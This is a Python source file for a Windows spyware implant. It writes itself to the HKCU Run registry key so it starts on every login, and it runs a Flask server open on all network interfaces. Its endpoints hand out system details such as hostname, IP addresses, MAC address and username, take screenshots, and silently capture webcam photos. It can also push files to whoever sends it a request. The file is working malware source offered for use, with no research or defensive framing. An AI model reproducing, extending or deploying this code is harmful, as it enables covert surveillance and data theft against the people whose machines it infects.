import winreg as reg
import os
import threading
import requests
import time
import sys
from flask import Flask, request, jsonify
import winreg as reg
import os
import threading
import socket
import uuid
import sys
import time
from flask import Flask, send_file
import cv2
import pyautogui
import datetime

# Define the path to the current executable
def get_exe_path():
    return os.path.realpath(sys.argv[0])

# Add the program to a specified registry key for persistence
def add_to_registry(key_path, key_name="MyPersistentApp"):
    try:
        if key_path.startswith("HKEY_CURRENT_USER"):
            root_key = reg.HKEY_CURRENT_USER
            sub_key = key_path.replace("HKEY_CURRENT_USER\\", "")
        elif key_path.startswith("HKEY_LOCAL_MACHINE"):
            root_key = reg.HKEY_LOCAL_MACHINE
            sub_key = key_path.replace("HKEY_LOCAL_MACHINE\\", "")

        # Open registry key and set the value to run the app at startup
        key = reg.CreateKey(root_key, sub_key)
        reg.SetValueEx(key, key_name, 0, reg.REG_SZ, get_exe_path())
        reg.CloseKey(key)
        print(f"Successfully added to {key_path} for persistence.")
    except Exception as e:
        print(f"Failed to add to registry: {e}")

# Function to check if the program is already set to run at startup
def check_registry(key_path, key_name="MyPersistentApp"):
    try:
        if key_path.startswith("HKEY_CURRENT_USER"):
            root_key = reg.HKEY_CURRENT_USER
            sub_key = key_path.replace("HKEY_CURRENT_USER\\", "")
        elif key_path.startswith("HKEY_LOCAL_MACHINE"):
            root_key = reg.HKEY_LOCAL_MACHINE
            sub_key = key_path.replace("HKEY_LOCAL_MACHINE\\", "")

        key = reg.OpenKey(root_key, sub_key, 0, reg.KEY_READ)
        value, regtype = reg.QueryValueEx(key, key_name)
        if value == get_exe_path():
            print("Already in startup registry.")
            return True
    except FileNotFoundError:
        print("Not found in startup registry.")
        return False

# Flag to control the server's dormancy state
server_running = True

# Update response.txt content based on the send count
def update_response_file():
    count = 1
    counter_file = "counter.txt"

    # Read the current count from counter.txt, if it exists
    if os.path.exists(counter_file):
        with open(counter_file, "r") as file:
            count = int(file.read().strip()) + 1

    # Update counter.txt with the new count
    with open(counter_file, "w") as file:
        file.write(str(count))

    # Write the updated count to response.txt
    with open("response.txt", "w") as file:
        file.write(f"Hi {count}")
    print(f"response.txt file updated with content 'Hi {count}'.")

# Flask application instance
app = Flask(__name__)

@app.route('/getfile', methods=['GET'])
def get_file():
    global server_running
    if not server_running:
        return "Server is dormant.", 503

    # Capture the requester's IP address
    requester_ip = request.remote_addr
    print(f"GET request received from {requester_ip}; preparing to send file...")

    # Update the response file with the current count
    update_response_file()

    # Construct the receiver URL with the requester's IP address
    receiver_url = f"http://{requester_ip}:5000/receivefile"
    file_sent = send_text_file_via_post("response.txt", receiver_url)

    if file_sent:
        return "File successfully sent.", 200
    else:
        return "Failed to send file.", 500
    
def get_system_info():
    # Get the device (hostname) name
    device_name = socket.gethostname()
    
    # Get the local IP address
    ip_address = socket.gethostbyname(device_name)
    
    # Get the MAC ID
    mac_id = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8 * 6, 8)][::-1])
    
    # Get the username
    username = os.getlogin()

    # Get the public IP address (using an external service)
    try:
        public_ip = requests.get('https://api.ipify.org').text  # Alternatively, you can use checkip.amazonaws.com
    except requests.RequestException:
        public_ip = "Could not retrieve public IP"

    # Return the system information as a dictionary
    return {
        "Device Name": device_name,
        "Local IP Address": ip_address,
        "Public IP Address": public_ip,
        "MAC ID": mac_id,
        "Username": username
    }

# Create Info.txt file with system information
def create_info_file():
    # Get the Documents folder path
    user_profile = os.environ.get("USERPROFILE")  # e.g., C:\Users\<username>
    documents_folder = os.path.join(user_profile, "Documents")  # C:\Users\<username>\Documents
    file_path = os.path.join(documents_folder, "Info.txt")  # C:\Users\<username>\Documents\Info.txt

    # Get system information
    info = get_system_info()

    # Write system information to Info.txt
    with open(file_path, "w") as file:
        for key, value in info.items():
            file.write(f"{key}: {value}\n")

    print(f"Info.txt file created at {file_path} with system information.")
    return file_path

@app.route('/getData', methods=['GET'])
def get_data():
    # Ensure the Info.txt file exists
    info_file_path = os.path.join(os.environ.get("USERPROFILE"), "Documents", "Info.txt")
    
    #if not os.path.exists(info_file_path):
        # If Info.txt doesn't exist, create it
    create_info_file()
        #create_info_file()


    # Send the Info.txt file as an attachment
    return send_file(info_file_path, as_attachment=True)

def get_screenshots_folder():
    # Get the user's home directory and append the "Pictures" and "Screenshots" folder path
    user_profile = os.environ.get("USERPROFILE")  # Get the user's home directory (C:\Users\<username>)
    pictures_folder = os.path.join(user_profile, "Pictures", "Screenshots")  # Path to the Screenshots folder
    return pictures_folder

    
@app.route('/screenshot', methods=['GET'])
def take_screenshot():
    try:
        # Get the Screenshots folder path
        screenshots_folder = get_screenshots_folder()
        
        # Create the folder if it doesn't exist
        if not os.path.exists(screenshots_folder):
            os.makedirs(screenshots_folder)

        # Generate a file name with timestamp
        screenshot_file = os.path.join(screenshots_folder, f'screenshot_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
        
        # Take the screenshot
        pyautogui.screenshot(screenshot_file)
        
        # Return the screenshot file as a response
        return send_file(screenshot_file, as_attachment=True)

    except Exception as e:
        return {"error": str(e)}, 500


@app.route('/capture', methods=['GET'])
def capture_photo():
    # Create a directory for captured photos if it doesn't exist
    if not os.path.exists('captures'):
        os.makedirs('captures')
    
    # Generate a file name with timestamp
    photo_file = os.path.join('captures', f'photo_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
    
    # Capture the photo from the webcam
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(photo_file, frame)
    cap.release()
    
    return send_file(photo_file, as_attachment=True)

@app.route('/stopWork', methods=['GET'])
def stop_work():
    global server_running
    print("Stop command received; entering dormant mode...")
    server_running = False
    return "Server going dormant.", 200

def send_text_file_via_post(file_path, url, timeout=10):
    try:
        with open(file_path, 'rb') as file:
            files = {'file': file}
            response = requests.post(url, files=files, timeout=timeout)
            print(f"File sent via POST to {url}, response:", response.status_code)
            return response.status_code == 200  # Success if response code is 200
    except requests.exceptions.Timeout:
        print("POST request timed out.")
        return False  # Timeout occurred
    except requests.exceptions.RequestException as e:
        print("POST request failed:", e)
        return False  # Other error occurred

# Function to start the Flask server
def start_server():
    app.run(host='0.0.0.0', port=8080, debug=False)

# Specify registry key for persistence
REGISTRY_KEY_PATH = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"

# Main execution flow
if not check_registry(REGISTRY_KEY_PATH):
    add_to_registry(REGISTRY_KEY_PATH)

# Start Flask server in a separate thread to avoid blocking the main thread
server_thread = threading.Thread(target=start_server, daemon=True)
server_thread.start()

# Main program loop
try:
    while server_running:
        time.sleep(1)
except KeyboardInterrupt:
    print("Exiting program.")
